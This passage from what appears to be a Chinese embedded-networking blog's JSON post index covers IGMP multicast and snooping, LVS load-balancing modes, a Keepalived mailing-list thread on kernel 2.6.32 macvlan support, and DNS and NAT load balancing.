地址（二进制1110 开始），从224.0.0.0～239.255.255.255。由于 组播MAC 地址是一个虚拟的地址，并不是真实网卡的MAC 地址，那么网卡在发送报文是 二层MAC 地址怎么确定呢？答案是采用地址映射的方法将三层IP 地址映射到MAC 地址。 映射关系如下。 从上面的映射关系可以看出 IP 地址的五个bit 无法映射到MAC 层，因为MAC 层的这五个 bit 已经确定。也就是说有32 个IP 组播组会被映射为同一个MAC 地址。 （在这里不能不说一个面试常问的问题：一个网卡的 MAC 地址是53:10:10:10:10:10， 问这是一个合法的MAC 地址吗？原因？） 2. 报文格式： IGMP 报文封装在IP 层上，在IP 层的协议类型码是0x02。IGMPv2 有report, query 和 leave 有三种类型的报文， IGMP report：type 为0x16(IGMPv2)或0x12(IGMPv1) IGMP leave：type 为0x17 IGMP query：type 为0x11，query 报文有两种情况，一种是针对特定组播组的查询，例 如router 要查询属于组播组225.225.100.3 的所有成员，另一种是通用查询，查询所有主机 加入组播组的情况，两者的主要区别是在Group Address 上。 IGMP data：与通常的报文相同，主要区别是MAC 地址使用的是组播MAC。 三、 IGMP 协议的应用问题 1. IGMP snooping 首先我们来看这样一种情况，交换机的A 端口(port)有一个组播包需要送到主机D。通 常交换机会将这个报文flood 到每一个端口，确保报文能够送到主机D。但这样处理存在问 题，主机D 挂在port C 上，switch 没有必要将报文发往每一个端口，占用其他端口的网络 资源，同时也占用CPU 的资源。Linux 源码中也没有对组播报文进行特殊处理， linux-2.4.33\\net\\bridge\\br_input.c 行79 br_handle_frame_finish() if (dest[0] &amp; 1) { br_flood_forward(br, skb, !passedup);/flood 报文到其他端口/ if (!passedup) br_pass_frame_up(br, skb);/向local IP stack 发送数据/ goto out; } 针对上面所说的问题，人们提出了IGMP snooping 技术，该技术的主要思想是侦听每一 个端口上的IGMP 报文，通过解析报文获得其组播地址，将组播地址与交换机的端口联系起 来。当关系建立后，就可以通过组播组查到目的port，从而不需要flood 报文到每一个端口 上。 交换机的桥模块维护这样一张表，以组播组为索引，组播组下记录了属于该组播组的所 有端口。当一个组播报文从A 口送到交换机时，交换机从报文中获取组播组地址，然后从 表中找出该组播组，将报文直接发送到下属的C 端口。而E，F，H 端口不会有数据送到。 组播索引表采用这样的管理，桥接收到一个 IGMP report 报文解析report 报文中的组播 组，创建组播索引，将report 报文的端口记录下来。当然当组播组已经存在了就不需要重新 创建组播索引了，只需要检查端口确认是否要添加端口。当桥收到一个IGMP leave 报文时， 根据报文中的组播地址和报文端口从表中找到要离开的端口，删除端口。 是不是经过这样处理就没有问题了呢？答案是否定的。假如交换机的 C 端口连接的不 是主机而是一个HUB，HUB 下挂了两台主机，并且两台主机都加入了同一个组播组，也就 是说C 端口下有两台主机，当其中一台主机发送IGMP leave 后，会导致C 端口被删除，结 果另一台主机也无法接收到组播数据了。 基于端口的组播报文转发是有问题的，一个解决方法是基于MAC 的组播转发，组播组 下面记录的不是port 而是MAC。当组播组有报文时需要处理时，首先查找MAC，然后从 桥中根据MAC 找到port，最后将报文转发到该port。 其实许多支持 IGMP snooping 的交换机中组播组n 的最大值是确定的，一般是256，我 们可以让一台主机加入到256 个组播组中，把所有的组播组资源占尽，后续的其他主机的组 播报文将无法得到处理。这也算是一种攻击吧。 2. IGMP proxy 简单一句话：设备的上行端口担任主机的角色发送report 和leave 报文，下行端口执行 路由器的角色发送query 报文。 3. IGMP report/leave 报文","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"组播路由pimd测试及分析","slug":"EMBEDDED/组播路由pimd测试及分析","date":"2016-05-06T07:32:34.000Z","updated":"2017-07-10T02:01:05.143Z","comments":true,"path":"EMBEDDED/组播路由pimd测试及分析.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/组播路由pimd测试及分析.html","excerpt":"","text":"","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"LVS：三种负载均衡方式比较","slug":"EMBEDDED/LVS：三种负载均衡方式比较","date":"2016-05-04T08:02:13.000Z","updated":"2017-07-10T08:50:46.587Z","comments":true,"path":"EMBEDDED/LVS：三种负载均衡方式比较.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/LVS：三种负载均衡方式比较.html","excerpt":"1、什么是[LVS？ 首先简单介绍一下LVS (Linux](http://www.chinabyte.com/keyword/LVS/) Virtual Server)到底是什么东西，其实它是一种集群(Cluster)技术，采用IP负载均衡技术和基","text":"1、什么是[LVS？ 首先简单介绍一下LVS (Linux](http://www.chinabyte.com/keyword/LVS/) Virtual Server)到底是什么东西，其实它是一种集群(Cluster)技术，采用IP负载均衡技术和基于内容请求分发技术。调度器具有很好的吞吐率，将请求均衡地转移到不同的服务器上执行，且调度器自动屏蔽掉服务器的故障，从而将一组服务器构成一个高性能的、高可用的虚拟服务器。整个服务器集群的结构对客户是透明的，而且无需修改客户端和服务器端的程序。 为此，在设计时需要考虑系统的透明性、可伸缩性、高可用性和易管理性。一般来说，LVS集 群采用三层结构，其体系结构如图所示： LVS集群的体系结构 2、LVS主要组成部分为： 负载调度器(load balancer/ Director)，它是整个集群对外面的前端机，负责将客户的请求发送到一组服务器上执行，而客户认为服务是来自一个IP地址(我们可称之为虚拟IP地址)上的。 服务器池(server pool/ Realserver)，是一组真正执行客户请求的服务器，执行的服务一般有WEB、MAIL、[FTP和DNS等。 共享存储](http://www.chinabyte.com/keyword/FTP/)(shared storage)，它为服务器池提供一个共享的存储区，这样很容易使得服务器池拥有相同的内容，提供相同的服务。 3、LVS负载均衡方式: ◆Virtual Server via Network Address Translation NAT(VS/NAT) VS/NAT是一种最简单的方式，所有的RealServer只需要将自己的网关指向Director即可。客户端可以是任意操作系统，但此方式下，一个Director能够带动的RealServer比较有限。在VS/NAT的方式下，Director也可以兼为一台RealServer。VS/NAT的体系结构如图所示。 VS/NAT的体系结构 ◆Virtual Server via IP Tunneling(VS/TUN) IP隧道(IP tunneling)是将一个IP报文封装在另一个IP报文的技术，这可以使得目标为一个IP地址的数据报文能被封装和转发到另一个IP地址。IP隧道技术亦称为IP封装技术(IP encapsulation)。IP隧道主要用于移动主机和虚拟私有网络(Virtual Private Network)，在其中隧道都是静态建立的，隧道一端有一个IP地址，另一端也有唯一的IP地址。它的连接调度和管理与VS/NAT中的一样，只是它的报文转发方法不同。调度器根据各个服务器的负载情况，动态地选择一台服务器，将请求报文封装在另一个IP报文中，再将封装后的IP报文转发给选出的服务器;服务器收到报文后，先将报文解封获得原来目标地址为 VIP 的报文，服务器发现VIP地址被配置在本地的IP隧道设备上，所以就处理这个请求，然后根据路由表将响应报文直接返回给客户。 VS/TUN的体系结构 VS/TUN的工作流程： ◆Virtual Server via Direct Routing(VS/DR) VS/DR方式是通过改写请求报文中的MAC地址部分来实现的。Director和RealServer必需在物理上有一个网卡通过不间断的局域网相连。 RealServer上绑定的VIP配置在各自Non-ARP的网络设备上(如lo或tunl),Director的VIP地址对外可见，而RealServer的VIP对外是不可见的。RealServer的地址即可以是内部地址，也可以是真实地址。 VS/DR的体系结构 VS/DR的工作流程 VS/DR的工作流程如图所示：它的连接调度和管理与VS/NAT和VS/TUN中的一样，它的报文转发方法又有不同，将报文直接路由给目标服务器。在VS/DR中，调度器根据各个服务器的负载情况，动态地选择一台服务器，不修改也不封装IP报文，而是将数据帧的MAC地址改为选出服务器的MAC地址，再将修改后的数据帧在与服务器组的局域网上发送。因为数据帧的MAC地址是选出的服务器，所以服务器肯定可以收到这个数据帧，从中可以获得该IP报文。当服务器发现报文的目标地址VIP是在本地的网络设备上，服务器处理这个报文，然后根据路由表将响应报文直接返回给客户。 VS/DR的工作流程 4、三种负载均衡方式比较： ◆Virtual Server via NAT VS/NAT 的优点是服务器可以运行任何支持TCP/IP的操作系统，它只需要一个IP地址配置在调度器上，服务器组可以用私有的IP地址。缺点是它的伸缩能力有限，当服务器结点数目升到20时，调度器本身有可能成为系统的新瓶颈，因为在VS/NAT中请求和响应报文都需要通过负载调度器。我们在Pentium166 处理器的主机上测得重写报文的平均延时为60us，性能更高的处理器上延时会短一些。假设TCP报文的平均长度为536 Bytes，则调度器的最大吞吐量为8.93 MBytes/s. 我们再假设每台服务器的吞吐量为800KBytes/s，这样一个调度器可以带动10台服务器。(注：这是很早以前测得的数据) 基于 VS/NAT的的集群系统可以适合许多服务器的性能要求。如果负载调度器成为系统新的瓶颈，可以有三种方法解决这个问题：混合方法、VS/TUN和 VS/DR。在DNS混合集群系统中，有若干个VS/NAT负调度器，每个负载调度器带自己的服务器集群，同时这些负载调度器又通过RR-DNS组成简单的域名。 但VS/TUN和VS/DR是提高系统吞吐量的更好方法。 对于那些将IP地址或者端口号在报文数据中传送的网络服务，需要编写相应的应用模块来转换报文数据中的IP地址或者端口号。这会带来实现的工作量，同时应用模块检查报文的开销会降低系统的吞吐率。 ◆Virtual Server via IP Tunneling 在VS/TUN 的集群系统中，负载调度器只将请求调度到不同的后端服务器，后端服务器将应答的数据直接返回给用户。这样，负载调度器就可以处理大量的请求，它甚至可以调度百台以上的服务器(同等规模的服务器)，而它不会成为系统的瓶颈。即使负载调度器只有100Mbps的全双工网卡，整个系统的最大吞吐量可超过 1Gbps。所以，VS/TUN可以极大地增加负载调度器调度的服务器数量。VS/TUN调度器可以调度上百台服务器，而它本身不会成为系统的瓶颈，可以用来构建高性能的超级服务器。VS/TUN技术对服务器有要求，即所有的服务器必须支持“IP Tunneling”或者“IP Encapsulation”协议。目前，VS/TUN的后端服务器主要运行Linux操作系统，我们没对其他操作系统进行测试。因为“IP Tunneling”正成为各个操作系统的标准协议，所以VS/TUN应该会适用运行其他操作系统的后端服务器。 ◆Virtual Server via Direct Routing 跟VS/TUN方法一样，VS/DR调度器只处理客户到服务器端的连接，响应数据可以直接从独立的网络路由返回给客户。这可以极大地提高LVS集群系统的伸缩性。跟VS/TUN相比，这种方法没有IP隧道的开销，但是要求负载调度器与实际服务器都有一块网卡连在同一物理网段上，服务器网络设备(或者设备别名)不作ARP响应，或者能将报文重定向(Redirect)到本地的Socket端口上。 三种LVS负载均衡技术的优缺点归纳以下表： VS/NATVS/TUNVS/DR 服务器操作系统任意支持隧道多数(支持Non-arp) 服务器网络私有网络局域网/广域网局域网 服务器数目(100M网络)10~20100大于100 服务器网关负载均衡器自己的路由自己的路由 效率一般高最高 注：以上三种方法所能支持最大服务器数目的估计是假设调度器使用100M网卡，调度器的硬件配置与后端服务器的硬件配置相同，而且是对一般Web服务。使 用更高的硬件配置(如千兆网卡和更快的处理器)作为调度器，调度器所能调度的服务器数量会相应增加。当应用不同时，服务器的数目也会相应地改变。所以，以上数据估计主要是为三种方法的伸缩性进行量化比较。 5、负载均衡调度算法 ◆最少的连接方式(Least Connection)：传递新的连接给那些进行最少连接处理的服务器。当其中某个服务器发生第二到第7 层的故障，BIG-IP 就把其从服务器队列中拿出，不参加下一次的用户请求的分配, 直到其恢复正常。 ◆最快模式(Fastest)：传递连接给那些响应最快的服务器。当其中某个服务器发生第二到第7 层的故障，BIG-IP 就把其从服务器队列中拿出，不参加下一次的用户请求的分配，直到其恢复正常。 ◆观察模式(Observed)：连接数目和响应时间以这两项的最佳平衡为依据为新的请求选择服务器。当其中某个服务器发生第二到第7 层的故障，BIG-IP就把其从服务器队列中拿出，不参加下一次的用户请求的分配，直到其恢复正常。 ◆预测模式(Predictive)：BIG-IP利用收集到的服务器当前的性能指标，进行预测分析，选择一台服务器在下一个时间片内，其性能将达到最佳的服务器相应用户的请求。(被BIG-IP 进行检测) ◆动态性能分配(Dynamic Ratio-APM):BIG-IP 收集到的应用程序和应用服务器的各项性能参数，动态调整流量分配。 ◆动态服务器补充(Dynamic Server Act.):当主服务器群中因故障导致数量减少时，动态地将备份服务器补充至主服务器群。 ◆服务质量(QoS):按不同的优先级对数据流进行分配。 ◆服务类型(ToS): 按不同的服务类型(在Type of Field中标识)负载均衡对数据流进行分配。 ◆规则模式：针对不同的数据流设置导向规则，用户可自行。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"[Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel","slug":"EMBEDDED/[Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel","date":"2016-05-04T07:07:10.000Z","updated":"2017-07-10T08:50:30.757Z","comments":true,"path":"EMBEDDED/[Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/[Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel.html","excerpt":"I want to use keepalived vrrp with vmac in 2.6.32-13 linux kernel, but configuration is failing and I do a trick and configure","text":"I want to use keepalived vrrp with vmac in 2.6.32-13 linux kernel, butconfiguration is failing and I do a trick and configured successfully butwhen I compiling I encountered with errors.IFLA_MACVLAN_MODE and MACVLAN_MODE_PRIVATE not exported throughnetlink in 2.6.32.How can I use keepalived vrrp(with vmac) with 2.6.32-13 linux kernel?What is the supported minimum kernel version of keepalived? ./configure –with-kernel-dir=/usr/src/linux-headers-2.6.32-13Keepalived configuration————————Keepalived version : 1.2.3Compiler : gccCompiler flags : -g -O2Extra Lib : -lpopt -lssl -lcrypto -lnlUse IPVS Framework : YesIPVS sync daemon support : YesIPVS use libnl : YesUse VRRP Framework : YesUse Debug flags : Nogcc -g -O2 -I/usr/src/linux-headers-2.6.32/include -I../include-I../../lib -Wall -Wunused -Wstrict-prototypes -D_KRNL_26-D_WITHLVS -D_HAVE_IPVSSYNCD -c vrrp_vmac.cvrrp_vmac.c: In function ‘netlink_link_setmode’:vrrp_vmac.c:96: error: ‘IFLA_MACVLAN_MODE’ undeclared (first use inthis function)vrrp_vmac.c:96: error: (Each undeclared identifier is reported only oncevrrp_vmac.c:96: error: for each function it appears in.)vrrp_vmac.c:97: error: ‘MACVLAN_MODE_PRIVATE’ undeclared (first use inthis function)make[2]: [vrrp_vmac.o] Error 1make[2]: Leaving directory `/home/szepcs/keepalived-1.2.3/keepalived/vrrp’make[1]: [all] Error 1make[1]: Leaving directory `/home/szepcs/keepalived-1.2.3/keepalived’make: * [all] Error 2 Thread view [Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel From: umit &lt;uyalap@gm…&gt; - 2013-04-29 21:56:01I want to use keepalived vrrp with vmac in 2.6.32-13 linux kernel, butconfiguration is failing and I do a trick and configured successfully butwhen I compiling I encountered with errors.IFLA_MACVLAN_MODE and MACVLAN_MODE_PRIVATE not exported throughnetlink in 2.6.32.How can I use keepalived vrrp(with vmac) with 2.6.32-13 linux kernel?What is the supported minimum kernel version of keepalived? ./configure –with-kernel-dir=/usr/src/linux-headers-2.6.32-13Keepalived configuration————————Keepalived version : 1.2.3Compiler : gccCompiler flags : -g -O2Extra Lib : -lpopt -lssl -lcrypto -lnlUse IPVS Framework : YesIPVS sync daemon support : YesIPVS use libnl : YesUse VRRP Framework : YesUse Debug flags : Nogcc -g -O2 -I/usr/src/linux-headers-2.6.32/include -I../include-I../../lib -Wall -Wunused -Wstrict-prototypes -D_KRNL_26-D_WITHLVS -D_HAVE_IPVSSYNCD -c vrrp_vmac.cvrrp_vmac.c: In function ‘netlink_link_setmode’:vrrp_vmac.c:96: error: ‘IFLA_MACVLAN_MODE’ undeclared (first use inthis function)vrrp_vmac.c:96: error: (Each undeclared identifier is reported only oncevrrp_vmac.c:96: error: for each function it appears in.)vrrp_vmac.c:97: error: ‘MACVLAN_MODE_PRIVATE’ undeclared (first use inthis function)make[2]: [vrrp_vmac.o] Error 1make[2]: Leaving directory `/home/szepcs/keepalived-1.2.3/keepalived/vrrp’make[1]: [all] Error 1make[1]: Leaving directory `/home/szepcs/keepalived-1.2.3/keepalived’make: * [all] Error 2 [Re: Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel** From: Sander Klein &lt;roedie@ro…&gt; - 2013-05-01 09:29:08On 29.04.2013 23:55, umit wrote:&gt; I want to use keepalived vrrp with vmac in 2.6.32-13 linux kernel, but&gt; configuration is failing and I do a trick and configured successfully&gt; but&gt; when I compiling I encountered with errors.&gt;&gt; IFLA_MACVLAN_MODE and MACVLAN_MODE_PRIVATE not exported through&gt; netlink in 2.6.32.&gt;&gt; How can I use keepalived vrrp(with vmac) with 2.6.32-13 linux kernel?&gt; What is the supported minimum kernel version of keepalived?I’m not sure which kernel exactly, but I believe you need somethinglike 3.0.X or higher to get this working.Greets,Sander Re: [Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel From: Lennart Sorensen &lt;lsorense@cs…&gt; - 2013-05-01 18:59:02On Wed, May 01, 2013 at 11:12:28AM +0200, Sander Klein wrote:&gt; On 29.04.2013 23:55, umit wrote:&gt; &gt; I want to use keepalived vrrp with vmac in 2.6.32-13 linux kernel, but&gt; &gt; configuration is failing and I do a trick and configured successfully&gt; &gt; but&gt; &gt; when I compiling I encountered with errors.&gt; &gt;&gt; &gt; IFLA_MACVLAN_MODE and MACVLAN_MODE_PRIVATE not exported through&gt; &gt; netlink in 2.6.32.&gt; &gt;&gt; &gt; How can I use keepalived vrrp(with vmac) with 2.6.32-13 linux kernel?&gt; &gt; What is the supported minimum kernel version of keepalived?&gt;&gt; I’m not sure which kernel exactly, but I believe you need something&gt; like 3.0.X or higher to get this working.2.6.33 was the first kernel with IFLA_MACVLAN_MODE defined. 2.6.32 istoo old.–Len Sorensen Re: [Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel From: umit &lt;uyalap@gm…&gt; - 2013-05-01 20:46:46Thanks for reply, but 2.6.32.y kernel is long-term kernel version so I thinkthere must be a patch for support this behaviour.Can I find a patch that only difference from 2.6.32.y is aboutmacvlan(IFLA_MACVLAN_MODE)? Re: [Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel From: Lennart Sorensen &lt;lsorense@cs…&gt; - 2013-05-01 21:19:28On Wed, May 01, 2013 at 08:46:18PM +0000, umit wrote:&gt; Thanks for reply, but 2.6.32.y kernel is long-term kernel version so I think&gt; there must be a patch for support this behaviour.&gt;&gt; Can I find a patch that only difference from 2.6.32.y is about&gt; macvlan(IFLA_MACVLAN_MODE)?The commit 27c0b1a850cdea6298f573d835782f3337be913c in Linus’s git treewas done around the time of 2.6.32, and applies cleanly to 2.6.32(.0),so you can probably grab that and apply it easily.–Len Sorensen Re: [Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel From: umit &lt;uyalap@gm…&gt; - 2013-05-06 09:32:07Lennart Sorensen &lt;lsorense &lt;at&gt; csclub.uwaterloo.ca&gt; writes:&gt;&gt; On Wed, May 01, 2013 at 08:46:18PM +0000, umit wrote:&gt; &gt; Thanks for reply, but 2.6.32.y kernel is long-term kernel version so Ithink&gt; &gt; there must be a patch for support this behaviour.&gt; &gt;&gt; &gt; Can I find a patch that only difference from 2.6.32.y is about&gt; &gt; macvlan(IFLA_MACVLAN_MODE)?&gt;&gt; The commit 27c0b1a850cdea6298f573d835782f3337be913c in Linus’s git tree&gt; was done around the time of 2.6.32, and applies cleanly to 2.6.32(.0),&gt; so you can probably grab that and apply it easily.&gt;Thanks a lot.I searched macvlan at linux git tree(http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/log/?id=27c0b1a850cdea6298f573d835782f3337be913c&amp;qt=grep&amp;q=macvlan)I saw macvlan.c file after the commit2c11455321f37da6fe6cc36353149f9ac9183334 is equal with my mine 2.6.32.13macvlan.c fileSo there are some extra patches with2c11455321f37da6fe6cc36353149f9ac9183334 and27c0b1a850cdea6298f573d835782f3337be913c commits.Can I apply direct 27c0b1a850cdea6298f573d835782f3337be913c commit in my kernel?Should I apply other paches between above commits? Re: [Keepalived-devel] 1.2.7 wont compile with 2.6.32 kernel From: Lennart Sorensen &lt;lsorense@cs…&gt; - 2013-05-06 13:31:12On Mon, May 06, 2013 at 09:31:32AM +0000, umit wrote:&gt; Thanks a lot.&gt; I searched macvlan at linux git tree&gt; (http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/log/?id=27c0b1a850cdea6298f573d835782f3337be913c&amp;qt=grep&amp;q=macvlan)&gt;&gt; I saw macvlan.c file after the commit&gt; 2c11455321f37da6fe6cc36353149f9ac9183334 is equal with my mine 2.6.32.13&gt; macvlan.c file&gt;&gt; So there are some extra patches with&gt; 2c11455321f37da6fe6cc36353149f9ac9183334 and&gt; 27c0b1a850cdea6298f573d835782f3337be913c commits.&gt;&gt; Can I apply direct 27c0b1a850cdea6298f573d835782f3337be913c commit in my kernel?Yes. As far as I can tell it applies cleanly without any other commits.It might need other commits to work I suppose.&gt; Should I apply other paches between above commits?I see commits on macvlan.c from 2.6.32 up to the one adding the netlinkinterface with the defines you need are:commit 27c0b1a850cdea6298f573d835782f3337be913cAuthor: Arnd Bergmann &lt;arnd@…&gt;Date: Thu Nov 26 06:07:11 2009 +0000 macvlan: export macvlan mode through netlink In order to support all three modes of macvlan at runtime, extend the existing netlink protocol to allow choosing the mode per macvlan slave interface. This depends on a matching patch to iproute2 in order to become accessible in user land. Signed-off-by: Arnd Bergmann &lt;arnd@…&gt; Acked-by: Patrick McHardy &lt;kaber@…&gt; Signed-off-by: David S. Miller &lt;davem@…&gt;commit 618e1b7482f7a8a4c6c6e8ccbe140e4c331df4e9Author: Arnd Bergmann &lt;arnd@…&gt;Date: Thu Nov 26 06:07:10 2009 +0000 macvlan: implement bridge, VEPA and private mode This allows each macvlan slave device to be in one of three modes, depending on the use case: MACVLAN_PRIVATE: The device never communicates with any other device on the same upper_dev. This even includes frames coming back from a reflective relay, where supported by the adjacent bridge. MACVLAN_VEPA: The new Virtual Ethernet Port Aggregator (VEPA) mode, we assume that the adjacent bridge returns all frames where both source and destination are local to the macvlan port, i.e. the bridge is set up as a reflective relay. Broadcast frames coming in from the upper_dev get flooded to all macvlan interfaces in VEPA mode. We never deliver any frames locally. MACVLAN_BRIDGE: We provide the behavior of a simple bridge between different macvlan interfaces on the same port. Frames from one interface to another one get delivered directly and are not sent out externally. Broadcast frames get flooded to all other bridge ports and to the external interface, but when they come back from a reflective relay, we don’t deliver them again. Since we know all the MAC addresses, the macvlan bridge mode does not require learning or STP like the bridge module does. Based on an earlier patch “macvlan: Reflect macvlan packets meant for other macvlan devices” by Eric Biederman. Signed-off-by: Arnd Bergmann &lt;arnd@…&gt; Acked-by: Patrick McHardy &lt;kaber@…&gt; Cc: Eric Biederman &lt;ebiederm@…&gt; Signed-off-by: David S. Miller &lt;davem@…&gt;commit a1e514c5d0397b5581721aad9b303f7df83b103dAuthor: Arnd Bergmann &lt;arnd@…&gt;Date: Thu Nov 26 06:07:09 2009 +0000 macvlan: cleanup rx statistics We have very similar code for rx statistics in two places in the macvlan driver, with a third one being added in the next patch. Consolidate them into one function to improve overall readability of the driver. Signed-off-by: Arnd Bergmann &lt;arnd@…&gt; Acked-by: Patrick McHardy &lt;kaber@…&gt; Signed-off-by: David S. Miller &lt;davem@…&gt;commit fccaf71011b171883efee5bae321eac4760584d1Author: Eric Dumazet &lt;eric.dumazet@…&gt;Date: Tue Nov 17 08:53:49 2009 +0000 macvlan: Precise RX stats accounting With multi queue devices, its possible that several cpus call macvlan RX routines simultaneously for the same macvlan device. We update RX stats counter without any locking, so we can get slightly wrong counters. One possible fix is to use percpu counters, to get precise accounting and also get guarantee of no cache line ping pongs between cpus. Note: this adds 16 bytes (32 bytes on 64bit arches) of percpu data per macvlan device. Signed-off-by: Eric Dumazet &lt;eric.dumazet@…&gt; Signed-off-by: David S. Miller &lt;davem@…&gt;commit cbbef5e183079455763fc470ccf69008f92ab4b6Author: Patrick McHardy &lt;kaber@…&gt;Date: Tue Nov 10 06:14:24 2009 +0000 vlan/macvlan: propagate transmission state to upper layers Both vlan and macvlan devices usually don’t use a qdisc and immediately queue packets to the underlying device. Propagate transmission state of the underlying device to the upper layers so they can react on congestion and/or inform the sending process. Signed-off-by: Patrick McHardy &lt;kaber@…&gt; Signed-off-by: David S. Miller &lt;davem@…&gt;commit 81adee47dfb608df3ad0b91d230fb3cef75f0060Author: Eric W. Biederman &lt;ebiederm@…&gt;Date: Sun Nov 8 00:53:51 2009 -0800 net: Support specifying the network namespace upon device creation. There is no good reason to not support userspace specifying the network namespace during device creation, and it makes it easier to create a network device and pass it to a child network namespace with a well known name. We have to be careful to ensure that the target network namespace for the new device exists through the life of the call. To keep that logic clear I have factored out the network namespace grabbing logic into rtnl_link_get_net. In addtion we need to continue to pass the source network namespace to the rtnl_link_ops.newlink method so that we can find the base device source network namespace. Signed-off-by: Eric W. Biederman &lt;ebiederm@…&gt; Acked-by: Eric Dumazet &lt;eric.dumazet@…&gt;commit 23289a37e2b127dfc4de1313fba15bb4c9f0cd5bAuthor: Eric Dumazet &lt;eric.dumazet@…&gt;Date: Tue Oct 27 07:06:36 2009 +0000 net: add a list_head parameter to dellink() method Adding a list_head parameter to rtnl_link_ops-&gt;dellink() methods allow us to queue devices on a list, in order to dismantle them all at once. Signed-off-by: Eric Dumazet &lt;eric.dumazet@…&gt; Signed-off-by: David S. Miller &lt;davem@…&gt;That seems to match the range you found. You probably do need all ofthose (starting from the bottom and working forward).–Len Sorensen","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"负载均衡的几种方式","slug":"EMBEDDED/负载均衡的几种方式","date":"2016-05-03T03:12:42.000Z","updated":"2017-07-10T08:47:36.768Z","comments":true,"path":"EMBEDDED/负载均衡的几种方式.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/负载均衡的几种方式.html","excerpt":"DNS负载均衡 DNS负载均衡技术是在DNS服务器中为同一个主机名配置多个IP地址，在应答DNS查询时，DNS服务器对每个查询将以DNS文件中主机记录 的IP地址按顺序返回不同的解析结果，将客户端的访问引导到不同的机器上去，使得不同的客户端访问不同的服务器","text":"DNS负载均衡 DNS负载均衡技术是在DNS服务器中为同一个主机名配置多个IP地址，在应答DNS查询时，DNS服务器对每个查询将以DNS文件中主机记录 的IP地址按顺序返回不同的解析结果，将客户端的访问引导到不同的机器上去，使得不同的客户端访问不同的服务器，从而达到负载均衡的目的。 DNS负载均衡的优点是经济简单易行，并且服务器可以位于internet上任意的位置。但它也存在不少缺点： 为了使本DNS服务器和其他DNS服务器及时交互，保证DNS数据及时更新，使地址能随机分配，一般都要将DNS的刷新时间设置的较小，但太小将会使DNS流量大增造成额外的网络问题。 一旦某个服务器出现故障，即使及时修改了DNS设置，还是要等待足够的时间（刷新时间）才能发挥作用，在此期间，保存了故障服务器地址的客户计算机将不能正常访问服务器。 DNS负载均衡采用的是简单的轮循负载算法，不能区分服务器的差异，不能反映服务器的当前运行状态，不能做到为性能较好的服务器多分配请求，甚至会出现客户请求集中在某一台服务器上的情况。 要给每台服务器分配一个internet上的IP地址，这势必会占用过多的IP地址。 判断一个站点是否采用了DNS负载均衡的最简单方式就是连续的ping这个域名，如果多次解析返回的IP地址不相同的话，那么这个站点就很可能 采用的就是较为普遍的DNS负载均衡。但也不一定，因为如果采用的是DNS响应均衡，多次解析返回的IP地址也可能会不相同。不妨试试Ping一下www.yesky.com，www.sohu.com，www.yahoo.com。 现假设有三台服务器来应对www.test.com的请求。在采用BIND 8.x DNS服务器的unix系统上实现起来比较简单，只需在该域的数据记录中添加类似下面的结果： www1 IN A 192.1.1.1 www2 IN A 192.1.1.2 www3 IN A 192.1.1.3 www IN CNAME www1 www IN CNAME www2 www IN CNAME www3 在NT下的实现也很简单，下面详细介绍在win2000 server下实现DNS负载均衡的过程，NT4.0类似： 打开”管理工具”下的”DNS”，进入DNS服务配置控制台。 打开相应 DNS 服务器的”属性”，在”高级”选项卡的”服务器选项”中，选中”启用循环”复选框。此步相当于在注册表记录HKEY_LOCAL_MACHINE\\ SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters中添加一个双字节制值（dword值） RoundRobin，值为1。 打开正向搜索区域的相应区域（如test.com），新建主机添加主机 (A) 资源记录，记录如下： www IN A 192.1.1.1 www IN A 192.1.1.2 www IN A 192.1.1.3 在这里可以看到的区别是在NT下一个主机名对应多个IP地址记录，但在unix下，是先添加多个不同的主机名分别对应个自的IP地址，然后再把这些主机赋同一个别名（CNAME）来实现的。 在此需要注意的是，NT下本地子网优先级会取代多宿主名称的循环复用，所以在测试时，如果做测试用的客户机IP地址与主机资源记录的IP在同一有类掩码范围内，就需要清除在”高级”选项卡”服务器选项”中的”启用netmask排序”。 NAT负载均衡 NAT（Network Address Translation 网络地址转换）简单地说就是将一个IP地址转换为另一个IP地址，一般用于未经注册的内部地址与合法的、已获注册的Internet IP地址间进行转换。适用于解决Internet IP地址紧张、不想让网络外部知道内部网络结构等的场合下。每次NAT转换势必会增加NAT设备的开销，但这种额外的开销对于大多数网络来说都是微不足道 的，除非在高带宽有大量NAT请求的网络上。 NAT负载均衡将一个外部IP地址映射为多个内部IP地址，对每次连接请求动态地转换为一个内部服务器的地址，将外部连接请求引到转换得到地址的那个服务器上，从而达到负载均衡的目的。 NAT负载均衡是一种比较完善的负载均衡技术，起着NAT负载均衡功能的设备一般处于内部服务器到外部网间的网关位置，如路由器、防火墙、四层交换机、专用负载均衡器等，均衡算法也较灵活，如随机选择、最少连接数及响应时间等来分配负载。 